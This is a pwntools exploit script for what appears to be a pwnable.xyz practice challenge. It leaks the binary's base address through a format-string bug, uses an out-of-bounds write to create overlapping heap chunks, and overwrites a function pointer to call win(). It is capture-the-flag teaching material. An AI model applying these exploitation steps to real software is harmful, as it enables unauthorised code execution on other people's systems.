from pwn import *

###Structure
'''
game_meta
    |   4   |   4   |   4   |   4   |
0x00|  game_ver_ptr |       |       |
0x10| round | score1| score2| player|
0x20|    funcptr    |
'''

###Util
def play(moves,msg=None):
    r.sendlineafter('Exit\n','1')
    for i in moves:
        r.sendlineafter('(x y): ',' '.join(map(str,i[:2])))
        r.sendlineafter('(< 255): ',str(i[2]))
    r.sendlineafter('(x y): ','q')
    if msg!=None:
        r.sendlineafter('(max 63 chars) : ',msg[0])
        r.sendlineafter('(max 127 chars) : ',msg[1])

def show():
    r.sendlineafter('Exit\n','2')
    return r.recvuntil('\nKNUM v.01\n',drop=True).split(b'\n')[3:-2]

def reset():
    r.sendlineafter('Exit\n','3')

def note(data):
    r.sendlineafter('Exit\n','4')
    r.sendlineafter('me: ',data)

###Addr
show_ret_offset = 0x1949
win_offset = 0x19fe

###Exploit
r = remote('svc.pwnable.xyz',30043)

###Win game to input msg and trigger fmt and leak code_base, note that since printf_chk() is used, we cannot use %{num}$p as format string
move2win = [[1,10,250],[1,9,250],[1,8,250],[1,7,250],[1,10,250]]
msg = ['M30W','.%p.%p.%p.%p.%p.%p.%p.%p.']
play(move2win,msg)
show_ret_addr = int(show()[-1].split(b'.')[8][2:],16)
code_base = show_ret_addr-show_ret_offset
print(hex(code_base))

###OOB bug in placing numbers allow hijack size of next heap chunk, which we expand to create overlapping chunks
move2OOB = [[10,0,8]]
play(move2OOB)

###Use up the freed 0x50 chunk to force next malloc onto expanded chunk and overlap with game_meta structure
reset()
note(p64(0)*4+p64(code_base+win_offset))

###Win once again to malloc onto game_meta and hijack funcptr to win()
move2win = [[1,10,250],[1,9,250],[1,8,250],[1,7,250],[1,10,250]]
msg = [p64(0)*4+p64(code_base+win_offset),'M30W']
play(move2win,msg)

###Trigger funcptr of game_meta
r.sendline('1')
r.interactive()
